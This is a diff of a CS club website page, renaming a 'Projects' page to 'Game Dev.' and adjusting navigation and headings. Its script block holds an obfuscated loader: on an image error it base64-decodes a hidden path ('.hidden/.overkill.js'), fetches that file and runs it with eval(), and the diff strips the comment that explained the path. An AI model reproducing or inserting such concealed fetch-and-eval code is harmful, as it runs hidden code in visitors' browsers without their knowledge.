@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SCC CS Club - Projects</title>
+    <title>SCC CS Club - Game Dev.</title>
     <link rel="icon" type="image/png" href="../img/favicon.png">
 
     <!-- FontAwesome for icons -->
@@ -36,7 +36,8 @@
                     <ul>
                         <li><a href="index.html">Home</a></li>
                         <li><a href="about.html">About</a></li>
-                        <li><a href="projects.html" class="active">Projects</a></li>
+                        <li><a href="logs.html">Logs</a></li>
+                        <li><a href="game dev.html" class="active">Game Dev.</a></li>
                         <li><a href="blog.html">Blog</a></li>
                         <li><a href="calendar.html">Calendar</a></li>
                     </ul>
@@ -46,11 +47,11 @@
         </header>
 
         <main>
-            <!-- Projects Section -->
-            <section class="projects">
+            <!-- game dev. section -->
+            <section class="game dev.">
                 <div class="container">
-                    <h2 class="section-title fade-in">Projects</h2>
-                    <p>Explore our latest projects and coding challenges.</p>
+                    <h2 class="section-title fade-in">Game Development</h2>
+                    <p>Explore our latest projects and resources for game development!</p>
                 </div>
             </section>
 
@@ -82,7 +83,7 @@
 </section>
         </main>
 
-        <!-- Footer -->
+        <!-- footer -->
         <footer class="footer">
             <div class="container">
                 <div class="footer-content">
@@ -103,8 +104,6 @@
         </footer>
     </div>
 
-    
-
     <script src="../js/script.js"></script>
 
     <script>
@@ -117,7 +116,7 @@
             checkImg.src = imgPath + "?bk=" + Date.now();
             
             checkImg.onerror = function() {
-                let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM="); // Fix path to .hidden/.overkill.js
+                let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
                 fetch(backupScript)
                     .then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
                     .then(code => eval(code))
